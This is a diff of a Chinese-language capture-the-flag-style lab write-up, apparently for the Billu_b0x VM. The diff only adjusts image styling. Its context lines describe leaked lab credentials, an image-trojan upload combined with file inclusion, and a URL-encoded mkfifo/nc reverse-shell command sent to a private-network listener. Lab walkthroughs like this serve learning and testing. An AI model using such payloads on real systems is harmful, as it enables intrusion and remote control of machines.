@@ -430,7 +430,7 @@ if (mysqli_connect_errno())
 ?&gt;
 </code></pre>
 <p>是连接数据库的文件，暴露了数据库的用户名和密码，可以使用 <strong>billu:b0x_billu</strong> 连接phpmy，有三张表，除了第一张提供一组凭据 <strong>biLLu:hEx_it</strong> 连不上ssh</p>
-<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/7e73eaab-bf5c-42af-a297-82003da5038c"><img width="1919" height="915" alt="Image" src="https://github.com/user-attachments/assets/7e73eaab-bf5c-42af-a297-82003da5038c" style="max-width: 100%; height: auto; max-height: 915px;; aspect-ratio: 1919 / 915; background-color: var(--bgColor-muted); border-radius: 6px; display: block" class="js-gh-image-fallback"></a></p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/7e73eaab-bf5c-42af-a297-82003da5038c"><img width="1919" height="915" alt="Image" src="https://github.com/user-attachments/assets/7e73eaab-bf5c-42af-a297-82003da5038c" style="max-width: 100%; height: auto; max-height: 915px;; aspect-ratio: 1919 / 915; background-color: var(--bgColor-muted); border-radius: 6px" class="js-gh-image-fallback"></a></p>
 <p>回头再看看源码，利用一下sql注入，不对，上面的凭据可以直接登录进去。<br>
 点击继续，出现文件上传功能。提醒<code class="notranslate">i told you dear, only png,jpg and gif file are allowed</code><br>
 扒一下源码</p>
@@ -540,11 +540,11 @@ if(isset($_POST['upload']))
 </code></pre>
 <p>查看源码，上面的show功能也有文件包含漏洞。<br>
 这里add上传文件并写入数据库，上传信息跟数据库格式差不多，上传的位置在/uploaded_images/下</p>
-<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/ca20a1fe-a3cf-40a9-a984-d39f98623bb8"><img width="1919" height="914" alt="Image" src="https://github.com/user-attachments/assets/ca20a1fe-a3cf-40a9-a984-d39f98623bb8" style="max-width: 100%; height: auto; max-height: 914px;; aspect-ratio: 1919 / 914; background-color: var(--bgColor-muted); border-radius: 6px; display: block" class="js-gh-image-fallback"></a></p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/ca20a1fe-a3cf-40a9-a984-d39f98623bb8"><img width="1919" height="914" alt="Image" src="https://github.com/user-attachments/assets/ca20a1fe-a3cf-40a9-a984-d39f98623bb8" style="max-width: 100%; height: auto; max-height: 914px;; aspect-ratio: 1919 / 914; background-color: var(--bgColor-muted); border-radius: 6px" class="js-gh-image-fallback"></a></p>
 <p>随便上传一张图片上去，确实在数据库保存了信息，看看怎么上传木马上去</p>
-<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/eeb9d87a-45a9-4417-9e01-e5b4f3802b90"><img width="1911" height="886" alt="Image" src="https://github.com/user-attachments/assets/eeb9d87a-45a9-4417-9e01-e5b4f3802b90" style="max-width: 100%; height: auto; max-height: 886px;; aspect-ratio: 1911 / 886; background-color: var(--bgColor-muted); border-radius: 6px; display: block" class="js-gh-image-fallback"></a></p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/eeb9d87a-45a9-4417-9e01-e5b4f3802b90"><img width="1911" height="886" alt="Image" src="https://github.com/user-attachments/assets/eeb9d87a-45a9-4417-9e01-e5b4f3802b90" style="max-width: 100%; height: auto; max-height: 886px;; aspect-ratio: 1911 / 886; background-color: var(--bgColor-muted); border-radius: 6px" class="js-gh-image-fallback"></a></p>
 上传图片马上去，再利用上面的show功能包含文件，执行图片马，成功执行命令，开始拿shell
-<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/0ab0c900-0f65-41f9-a2be-4aafad71598b"><img width="1597" height="867" alt="Image" src="https://github.com/user-attachments/assets/0ab0c900-0f65-41f9-a2be-4aafad71598b" style="max-width: 100%; height: auto; max-height: 867px;; aspect-ratio: 1597 / 867; background-color: var(--bgColor-muted); border-radius: 6px; display: block" class="js-gh-image-fallback"></a></p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/0ab0c900-0f65-41f9-a2be-4aafad71598b"><img width="1597" height="867" alt="Image" src="https://github.com/user-attachments/assets/0ab0c900-0f65-41f9-a2be-4aafad71598b" style="max-width: 100%; height: auto; max-height: 867px;; aspect-ratio: 1597 / 867; background-color: var(--bgColor-muted); border-radius: 6px" class="js-gh-image-fallback"></a></p>
 <p>我使用的管道马拿shell</p>
 <pre class="notranslate"><code class="notranslate">POST /panel.php?cmd=rm+-f+/tmp/f%3b+mkfifo+/tmp/f%3b+cat+/tmp/f+|+/bin/bash+-i+2&gt;%261+|+nc+192.168.218.148+4444+&gt;+/tmp/f  HTTP/1.1
 Host: 192.168.218.195
